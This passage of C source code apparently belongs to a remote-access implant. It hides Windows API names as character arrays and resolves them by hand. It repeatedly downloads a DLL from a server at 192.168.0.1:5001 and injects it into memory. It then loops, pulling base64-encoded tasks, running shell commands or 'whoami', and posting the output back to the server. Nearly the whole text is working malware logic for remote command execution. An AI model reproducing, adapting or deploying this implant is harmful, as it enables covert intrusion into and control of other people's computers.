    CHAR winhttp_c[] = { 'w', 'i', 'n', 'h', 't', 't', 'p', 0 };
    CHAR msvcrt_c[] = { 'm', 's', 'v', 'c', 'r', 't', 0 };
    CHAR crypt32_c[] = { 'c', 'r', 'y', 'p', 't', '3', '2', '.', 'd', 'l', 'l', 0 };
    CHAR shlwapi_c[] = { 's', 'h', 'l', 'w', 'a', 'p', 'i', '.', 'd', 'l', 'l', 0 };

    // Library Declarations
    UINT64 kernel32dll, winhttpdll, msvcrtdll, user32dll, crypt32dll, shlwapidll;
 
    // Function Names
    CHAR messageBoxA_c[] = { 'M', 'e', 's', 's', 'a', 'g', 'e', 'B', 'o', 'x', 'A', 0 };
    CHAR messageBoxW_c[] = { 'M', 'e', 's', 's', 'a', 'g', 'e', 'B', 'o', 'x', 'W', 0 };
    CHAR loadlibrarya_c[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', 0 };
    CHAR winHttpOpen_c[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'O', 'p', 'e', 'n', 0 };
    CHAR winHttpConnect_c[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'C', 'o', 'n', 'n', 'e', 'c', 't', 0 };
    CHAR winHttpOpenRequest_c[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'O', 'p', 'e', 'n', 'R', 'e', 'q', 'u', 'e', 's', 't', 0 };
    CHAR winHttpSendRequest_c[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'S', 'e', 'n', 'd', 'R', 'e', 'q', 'u', 'e', 's', 't', 0 };
    CHAR winHttpReceiveResponse_c[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'R', 'e', 'c', 'e', 'i', 'v', 'e', 'R', 'e', 's', 'p', 'o', 'n', 's', 'e', 0 };
    CHAR WinHttpQueryDataAvailable_c[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'Q', 'u', 'e', 'r', 'y', 'D', 'a', 't', 'a', 'A', 'v', 'a', 'i', 'l', 'a', 'b', 'l', 'e', 0 };
    CHAR winHttpQueryHeaders_c[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'Q', 'u', 'e', 'r', 'y', 'H', 'e', 'a', 'd', 'e', 'r', 's', 0 };
    CHAR winHttpReadData_c[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'R', 'e', 'a', 'd', 'D', 'a', 't', 'a', 0 };
    CHAR winHttpCloseHandle_c[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 0 };
    CHAR getLastError_c[] = {'G', 'e', 't', 'L', 'a', 's', 't', 'E', 'r', 'r', 'o', 'r', 0 };
    CHAR wprintf_c[] = { 'w', 'p', 'r', 'i', 'n', 't', 'f', 0 };
    CHAR printf_c[] = { 'p', 'r', 'i', 'n', 't', 'f', 0 };
    CHAR snprintf_c[] = { '_', 's', 'n', 'p', 'r', 'i', 'n', 't', 'f', 0 };
    CHAR malloc_c[] = { 'm', 'a', 'l', 'l', 'o', 'c', 0 };
    CHAR calloc_c[] = { 'c', 'a', 'l', 'l', 'o', 'c', 0 };
    CHAR free_c[] = { 'f', 'r', 'e', 'e', 0 };
    CHAR virtualProtect_c[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'P', 'r', 'o', 't', 'e', 'c', 't', 0 };
    CHAR virtualAlloc_c[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c', 0 };
    CHAR createThread_c[] = { 'C', 'r', 'e', 'a', 't', 'e', 'T', 'h', 'r', 'e', 'a', 'd', 0 };
    CHAR waitForSingleObject_c[] = { 'W', 'a', 'i', 't', 'F', 'o', 'r', 'S', 'i', 'n', 'g', 'l', 'e', 'O', 'b', 'j', 'e', 'c', 't', 0 };
    CHAR CryptStringToBinaryA_c[] = { 'C', 'r', 'y', 'p', 't', 'S', 't', 'r', 'i', 'n', 'g', 'T', 'o', 'B', 'i', 'n', 'a', 'r', 'y', 'A', 0 };
    CHAR CryptBinaryToStringA_c[] = { 'C', 'r', 'y', 'p', 't', 'B', 'i', 'n', 'a', 'r', 'y', 'T', 'o', 'S', 't', 'r', 'i', 'n', 'g', 'A', 0 };
    CHAR StrToIntW_c[] = { 'S', 't', 'r', 'T', 'o', 'I', 'n', 't', 'W', 0 };
    CHAR closeHandle_c[] = { 'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 0 };
    CHAR sleep_c[] = { 'S', 'l', 'e', 'e', 'p', 0 };

    // Get Kernel32
    kernel32dll = GetKernel32();
    // GetLoadLibraryA
    api->LoadLibraryA = GetSymbolAddress((HANDLE)kernel32dll, loadlibrarya_c);

    // Getting Libraries
    user32dll = (UINT64)((LOADLIBRARYA)api->LoadLibraryA)(user32_c);
    msvcrtdll = (UINT64)((LOADLIBRARYA)api->LoadLibraryA)(msvcrt_c);
    winhttpdll = (UINT64)((LOADLIBRARYA)api->LoadLibraryA)(winhttp_c);
    crypt32dll = (UINT64)((LOADLIBRARYA)api->LoadLibraryA)(crypt32_c);
    shlwapidll = (UINT64)((LOADLIBRARYA)api->LoadLibraryA)(shlwapi_c);

    // WinHTTP
    api->WinHttpConnect = GetSymbolAddress((HANDLE)winhttpdll, winHttpConnect_c);
    api->WinHttpOpen = GetSymbolAddress((HANDLE)winhttpdll, winHttpOpen_c);
    api->WinHttpOpenRequest = GetSymbolAddress((HANDLE)winhttpdll, winHttpOpenRequest_c);
    api->WinHttpSendRequest = GetSymbolAddress((HANDLE)winhttpdll, winHttpSendRequest_c);
    api->WinHttpReceiveResponse = GetSymbolAddress((HANDLE)winhttpdll, winHttpReceiveResponse_c);
    api->WinHttpQueryDataAvailable = GetSymbolAddress((HANDLE) winhttpdll, WinHttpQueryDataAvailable_c);
    api->WinHttpQueryHeaders = GetSymbolAddress((HANDLE)winhttpdll, winHttpQueryHeaders_c);
    api->WinHttpReadData = GetSymbolAddress((HANDLE)winhttpdll, winHttpReadData_c);
    api->WinHttpCloseHandle = GetSymbolAddress((HANDLE)winhttpdll, winHttpCloseHandle_c);

    // Getting functions
    // User32
    // Msvcrt
    // kernel32
    api->malloc = GetSymbolAddress((HANDLE)msvcrtdll, malloc_c);
    api->calloc = GetSymbolAddress((HANDLE)msvcrtdll, calloc_c);
    api->free = GetSymbolAddress((HANDLE)msvcrtdll, free_c);
    api->GetLastError = GetSymbolAddress((HANDLE)kernel32dll, getLastError_c);
    api->MessageBoxA = GetSymbolAddress((HANDLE)user32dll, messageBoxA_c);
    api->MessageBoxW = GetSymbolAddress((HANDLE)user32dll, messageBoxW_c);
    api->wprintf = GetSymbolAddress((HANDLE)msvcrtdll, wprintf_c);
    api->printf = GetSymbolAddress((HANDLE)msvcrtdll, printf_c);
    api->snprintf = GetSymbolAddress((HANDLE)msvcrtdll, snprintf_c);
    api->VirtualProtect = GetSymbolAddress((HANDLE)kernel32dll, virtualProtect_c);
    api->VirtualAlloc = GetSymbolAddress((HANDLE)kernel32dll, virtualAlloc_c);
    api->CreateThread = GetSymbolAddress((HANDLE)kernel32dll, createThread_c);
    api->WaitForSingleObject = GetSymbolAddress((HANDLE)kernel32dll, waitForSingleObject_c);
    api->CloseHandle = GetSymbolAddress((HANDLE)kernel32dll, closeHandle_c);
    api->Sleep = GetSymbolAddress((HANDLE)kernel32dll, sleep_c);

    // crypt32
    api->CryptStringToBinaryA = GetSymbolAddress((HANDLE)crypt32dll, CryptStringToBinaryA_c);
    api->CryptBinaryToStringA = GetSymbolAddress((HANDLE)crypt32dll, CryptBinaryToStringA_c);

    // shlwapi
    api->StrToIntW = GetSymbolAddress((HANDLE)shlwapidll, StrToIntW_c);

    DWORD dwDllSize;
    LPVOID pEsgStdDll = 0;
    #ifdef DEBUG
    CHAR msg[] = { 'd', 'l', 'l', 'N', 'o', 't', 'F', 'o', 'u', 'n', 'd', 0 };
    #endif
    while (pEsgStdDll == 0)
    {
        pEsgStdDll = winHTTPClient(api, &dwDllSize);
        ((SLEEP)api->Sleep)(5000);
        if (pEsgStdDll != 0)
        { break; }
        #ifdef DEBUG
        ((MESSAGEBOXA)api->MessageBoxA)(0, msg, msg, 0X0L);
        #endif
    }

    ESG_STD_API EsgStdApi = { 0 };
    PESG_STD_API PEsgStdApi = &EsgStdApi;

    pEsgStdDll = inject(api, pEsgStdDll, dwDllSize);

    CHAR runCmd_c[] = { 'R', 'u', 'n', 'C', 'm', 'd', 0 };
    CHAR whoami_c[] = { 'W', 'h', 'o', 'a', 'm', 'i', 0 };

    PEsgStdApi->RunCmd = GetSymbolAddress((HANDLE)pEsgStdDll, runCmd_c);
    ((PRINTF)api->printf)("\np RunCmd: %p\n",PEsgStdApi->RunCmd);
    PEsgStdApi->Whoami = GetSymbolAddress((HANDLE)pEsgStdDll, whoami_c);
    ((PRINTF)api->printf)("\np Whoami: %p\n",PEsgStdApi->Whoami);

    //WCHAR wServer[] = { '1', '9', '2', '.', '1', '6', '8', '.', '1', '.', '1', '6', 0 };
    WCHAR wServer[] = { '1', '9', '2', '.', '1', '6', '8', '.', '0', '.', '1', 0 };
    WCHAR tasksPath[] = { '/', 't', 'a', 's', 'k', 's', '/', 0 };
    WCHAR uuid[] = { '1', '1', 'e', '3', 'b', '2', '7', 'c', '-', 'a', '1', 'e', '7', '-', '4', '2', '2', '4', '-', 'b', '4', 'd', '9', '-', '3', 'a', 'f', '3', '6', 'f', 'a', '2', 'f', '0', 'd', '0', 0 };
    WCHAR* fullPath = myConcatW(api, tasksPath, uuid);
    INTERNET_PORT port = 5001;

    CHAR* jsonResponse = NULL;
    CHAR* taskId = { 0 };
    CHAR* taskType = { 0 };
    CHAR* agentUuid = { 0 };
    CHAR* b64Task;
    CHAR* task = NULL;
    DWORD taskSize;
    CHAR* taskOutput;
    CHAR* b64EncodedOutput;
    DWORD b64EncodedOutputSize;
    DWORD sizeOfOutput;
    CHAR jsonFormat[] =
    {
    '{', '"', 't', 'a', 's', 'k', '_', 'i', 'd', '"', ':', ' ', '"', '%', 's', '"', ',',
    ' ', '"', 'a', 'g', 'e', 'n', 't', '_', 'u', 'u', 'i', 'd', '"', ':', ' ', '"',
    '%', 's', '"', ',', ' ', '"', 't', 'a', 's', 'k', '_', 'o', 'u', 't', 'p',
    'u', 't', '"', ':', ' ', '"', '%', 's', '"', '}'
    };
    DWORD totalJsonSize;
    CHAR* json;
    WCHAR fullPath2[] =
    {
        '/', 's', 'e', 'n', 'd', '_', 't', 'a', 's', 'k', '_', 'o', 'u', 't', 'p', 'u',
        't', '/','1', '1', 'e', '3', 'b', '2', '7', 'c', '-', 'a', '1', 'e', '7', '-',
        '4', '2', '2', '4', '-', 'b', '4', 'd', '9', '-', '3', 'a', 'f', '3', '6', 'f',
        'a', '2', 'f', '0', 'd', '0', 0
    };

    while (TRUE)
    {
        jsonResponse = GetRequest(api, wServer, port, fullPath);

        if (jsonResponse == NULL)
        {
            ((PRINTF)api->printf)("\njsonResponse is NULL, sleeping...\n");
            ((SLEEP)api->Sleep)(3000);
            continue;
        }
        ((PRINTF)api->printf)("\np jsonResponse: %p", jsonResponse);
        ((PRINTF)api->printf)("\njsonResponse: %s", jsonResponse);

        b64Task = readJsonTask(api, jsonResponse, &taskId, &taskType, &agentUuid);

        if (b64Task == NULL)
        {
            ((PRINTF)api->printf)("\nb64Task is NULL, sleeping...\n");
            ((SLEEP)api->Sleep)(3000);
            continue;
        }
        ((PRINTF)api->printf)("\np b64Task: %p\n", b64Task);
        ((PRINTF)api->printf)("\nb64Task: %s\n", b64Task);

        ((CRYPTSTRINGTOBINARYA)api->CryptStringToBinaryA)
        (
                (LPCSTR)b64Task,
                myStrlenA(b64Task),
                CRYPT_STRING_BASE64,
                NULL,
                &taskSize,
                NULL,
                NULL
        );
        ((PRINTF)api->printf)("\ntaskSize1: %d", taskSize);
        task = (CHAR*)((CALLOC)api->calloc)(taskSize+1, sizeof(CHAR));

        ((CRYPTSTRINGTOBINARYA)api->CryptStringToBinaryA)
        (
                (LPCSTR)b64Task,
                myStrlenA(b64Task),
                CRYPT_STRING_BASE64,
                (PBYTE)task,
                &taskSize,
                NULL,
                NULL
        );
        ((PRINTF)api->printf)("\ntaskSize2: %d", taskSize);

        ((PRINTF)api->printf)("\np task: %p", task);
        ((PRINTF)api->printf)("\ntask: %s", task);
        ((PRINTF)api->printf)("\nmyStrlenA(task): %d", myStrlenA(task));

        if (my_strcmp(taskType, "cmd") == 0)
        {
            CHAR* tmpOutput = ((RUNCMD)PEsgStdApi->RunCmd)(task, &sizeOfOutput);
            taskOutput = myTrim(tmpOutput, '\n');
            if (tmpOutput)
            { ((FREE)api->free)(tmpOutput); }
        }
        else if (my_strcmp(taskType, "whoami") == 0)
        {
            taskOutput = myTrim(((WHOAMI)PEsgStdApi->Whoami)(), '\n');
            ((PRINTF)api->printf)("\ntaskOutput: \n%s\n", taskOutput);
        }
        else
        {
            taskOutput = "oops";
            ((PRINTF)api->printf)("unknown task type, you f'ed up, this should never happen");
        }

        ((CRYPTBINARYTOSTRINGA)api->CryptBinaryToStringA)((BYTE*)taskOutput, myStrlenA(taskOutput)+1, CRYPT_STRING_BASE64+CRYPT_STRING_NOCRLF, NULL, &b64EncodedOutputSize);
        b64EncodedOutput = (CHAR*)((CALLOC)api->calloc)(b64EncodedOutputSize, sizeof(CHAR));
        ((CRYPTBINARYTOSTRINGA)api->CryptBinaryToStringA)((BYTE*)taskOutput, myStrlenA(taskOutput)+1, CRYPT_STRING_BASE64+CRYPT_STRING_NOCRLF, b64EncodedOutput, &b64EncodedOutputSize);

        totalJsonSize = myStrlenA(jsonFormat)-6 + b64EncodedOutputSize + myStrlenA(taskId) + myStrlenA(agentUuid) + 16;
        json = (CHAR*)((CALLOC)api->calloc)(totalJsonSize, sizeof(CHAR));
        ((SNPRINTF)api->snprintf)(json, totalJsonSize, jsonFormat, taskId, agentUuid, b64EncodedOutput);
        ((PRINTF)api->printf)("\ntotalJsonSize: %d\n", totalJsonSize);
        ((PRINTF)api->printf)("\nmyStrlenA(json): %d\n", myStrlenA(json));
        ((PRINTF)api->printf)("\njson: %s\n", json);
        PostRequest(api, wServer, port, fullPath2, json);

        /*
        if (taskOutput)
        {
            ((FREE)api->free)(taskOutput);
        }
        */
        if (b64EncodedOutput)
        {
            ((FREE)api->free)(b64EncodedOutput);
        }
        if (jsonResponse)
        {
            ((FREE)api->free)(jsonResponse);
        }
        if (json)
        {
            ((FREE)api->free)(json);
        }
        if (task)
        {
            ((FREE)api->free)(task);
        }

        ((SLEEP)api->Sleep)(3000);
    }
    if (fullPath)
    {
        ((FREE)api->free)(fullPath);
    }
}

